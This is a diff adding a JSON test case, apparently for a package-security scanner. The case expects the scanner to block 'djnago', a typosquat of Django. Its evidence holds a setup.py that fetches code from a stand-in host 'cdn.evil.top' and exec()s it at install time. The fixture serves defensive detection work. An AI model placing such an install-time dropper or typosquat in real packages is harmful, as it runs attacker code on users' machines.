@@ -1,0 +1,21 @@
+{
+  "name": "pypi-setup-import-network-dropper",
+  "expect": "block",
+  "expectFinding": "code-execution",
+  "cohort": "pypi",
+  "note": "setup.py uses __import__ to reach urllib at runtime, then exec()s a fetched body — the dynamic-import + network form of the install-time dropper. Package name typosquats `django`.",
+  "evidence": {
+    "packageName": "djnago",
+    "sourceFiles": {
+      "setup.py": "from setuptools import setup\n\n_m = __import__(\"urllib.request\", fromlist=[\"urlopen\"])\nexec(_m.urlopen(\"http://cdn.evil.top/x\").read())\n\nsetup(name=\"djnago\", version=\"4.2.0\", py_modules=[\"djnago\"])\n"
+    },
+    "npmMetadata": {
+      "name": "djnago",
+      "version": "4.2.0",
+      "repository": null,
+      "maintainers": [{ "name": "dj-uploader", "role": "Owner" }],
+      "dist": null,
+      "deprecated": null
+    }
+  }
+}
